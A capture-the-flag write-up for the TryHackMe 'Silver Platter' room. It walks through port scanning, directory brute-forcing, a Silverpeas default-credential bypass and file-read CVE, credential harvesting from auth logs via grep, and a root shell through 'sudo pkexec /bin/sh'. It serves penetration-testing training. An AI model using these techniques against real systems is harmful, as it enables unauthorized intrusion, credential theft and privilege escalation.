## THM CTF - Silver Platter

We can start changing local DNS to easily handle all the process.
```
sudo nano /etc/hosts
```
Add the record:
```
xxx.xxx.xxx.xxx	   silver.thm
```
***It’s important to note that if we’re unable to navigate the site correctly, we can always use the IP address as a backup.***

Now we can proceed with an ```Nmap``` scan.
```
sudo nmap -sS -T4 silver.thm -p-
```
We discovered three open ports, and we can list the services they provide.
```
sudo nmap -sS -T4 silver.thm -p22,80,8080 -sV -sC
```
These are the results
```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1b:1c:87:8a:fe:34:16:c9:f7:82:37:2b:10:8f:8b:f1 (ECDSA)
|_  256 26:6d:17:ed:83:9e:4f:2d:f6:cd:53:17:c8:80:3d:09 (ED25519)
80/tcp   open  http       nginx 1.18.0 (Ubuntu)
|_http-title: Hack Smarter Security
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http-proxy
```
The most enigmatic remains the ```8080 port```.

However we can try to enumerate the web server on ```port 80``` with ```Gobuster```.
```
gobuster dir -u http://silver.thm -w /usr/share/wordlists/dirb/common.txt -x html,js,txt,php,db,json,log
```
While we wait for Gobuster to complete, we can manually enumerate the site using ```Firefox```.

In the contact page we find a nickname:
```
scr1ptkiddy for the app Silverpeas
```
we save it for later use.

Searching for some anomalies, this site seems to work thanks to javascript that change the content of the main container with some DIV content hidden in the page.
Searching deeper in the code there is a DIV named:
```
elements
```
that have no button attached.

The site work with reference links so we can simply navigate to:
```
http://silver.thm/#elements
```
We are able to find a Form that could be interesting.

In the meantime, Gobuster hasn’t found anything useful yet.
```
/assets        (Status: 301) [Size: 178] [--> http://silver.thm/assets/]
/images        (Status: 301) [Size: 178] [--> http://silver.thm/images/]
/index.html    (Status: 200) [Size: 14124]
/index.html    (Status: 200) [Size: 14124]
/LICENSE.txt   (Status: 200) [Size: 17128]
/README.txt    (Status: 200) [Size: 771]
```
So we try to enumerate the hidden form for possible access.
However after some tries, It seems that ```POST method``` is not allowed, as we can see thanks to Nmap.
```
sudo nmap -sS --script="http-methods" silver.thm -p 80
```
This seems a dead end.

We can try to enumerate the ```port 8080``` in the same way we did with the ```port 80```.
```
gobuster dir -u http://silver.thm:8080 -w /usr/share/wordlists/dirb/big.txt -x html,js,txt,php,db,json,log -t 100
```
We found two folders:
```
/console     (Status: 302) [Size: 0] [--> /noredirect.html]
/website     (Status: 302) [Size: 0] [--> http://silver.thm:8080/website/]
```
Another dead end.

However, the information retrieved previously about that username was related to a system called ```Silverpeas```.

We can try:
```
http://silver.thm/silverpeas/
http://silver.thm:8080/silverpeas/
```
The second one reveals a login page, finally a potential attack surface and we already have a username to test.

Trying to login we discover some information.
The payload is:
```
{
	"Login": "scr1ptkiddy",
	"Password": "password",
	"DomainId": "0"
}
```
The login page is a JSP page and the incorrect login leave us with an error message and a payload in the URI.
```
Login or password incorrect
defaultLogin.jsp?DomainId=0&ErrorCode=1
Login?ErrorCode=1&DomainId=0
silverpeas/AuthenticationServlet
```
We can try to use the "Give me a new password service", but for now we can only enumerate the destination.
```
/silverpeas/CredentialsServlet/ForgotPassword
```
Inspecting the Login page we found an interesting script. 
It's written in french, but we can easily translate it.
```
  var domainId = 0;

  /* If the domainId is not in the request, then recovery from the cookie */
  if (GetCookie("defaultDomain")) {
    
  }

  if (GetCookie("svpLogin")) {
    document.getElementById("Login").value = GetCookie("svpLogin").toString();
  }

  document.getElementById("formLogin").Password.value = '';
  document.getElementById("formLogin").Login.focus();
```
The ```Cookie``` analysis would have been our next stop anyway.
However it is another dead end.

We attempted to use ```Hydra```, but after several unsuccessful attempts, we shifted our focus to some research conducted online.

Looking for ```Silverpeas```, we found default ```admin``` and ```password``` and a ```CVE``` that we can try.
```
SilverAdmin/SilverAdmin
```
```
https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d
```
Following the guide and using ```Firefox``` (or ```Burpsuite``` as an alternative) we can send the correct payload and obtain an admin access.

After some research we found another hint online:
```
https://rhinosecuritylabs.com/research/silverpeas-file-read-cves/
```
```
https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2023-47323
```
So we try this exploit to read all messages.

With message ```ID = 6``` we finally found something interesting: credentials.
```
http://silver.thm:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6
```
```
Dude how do you always forget the SSH password? Use a password manager and quit using your silly sticky notes. 

Username: tim

Password: *****************************+
```
Ok let's try to login in the SSH service... and we're in!
```
ssh tim@silver.thm
```
In the landing folder, we can find the ```first flag```.

Now we approach the privilege escalation problem.

Looking for SUID/SGID binaries:
```
find / -perm -u=s -type f 2>/dev/null
```
And SUDO privileges:
```
sudo -l
```
Poor tim, is not able to use sudo commands.

We can try with weak permissions:
```
find / -not -type l -perm -o+w 2>/dev/null
```
No luck.

After searching online, we found that maybe in some logs we can find interesting information.
```
cat /var/log/auth* | grep -i pass
```
We find:
```
tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=******** -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:6.3.1
```
We can try the found password to access tyler account.
```
su tyler
password: *********
```

We’re in, but we don't have access to root folder. Anyhow we can now use sudo commands.

Looking again for SUID/SGID binaries:
```
find / -perm -u=s -type f 2>/dev/null
```

We find:
```
pkexec
```
Thanks to:

[GTFOBins](https://gtfobins.github.io/gtfobins/pkexec/)

We are aware that we can gain access to a ```root shell``` by executing a specific command.
```
sudo pkexec /bin/sh
```
Finally, we’ve found the second flag in the root folder.

### Lesson learned:

* Need to focus no more than 30 minutes on the same attack vector (too much focus on port 80, ignoring port 8080)
* Take note of all details and the context (I have taken note only of the username in the enumeration phase and not the name of the product "SilverPeas").
* Search online for the product name or any clues that might indicate possible vulnerabilities.
* Remember to search the log files... always!
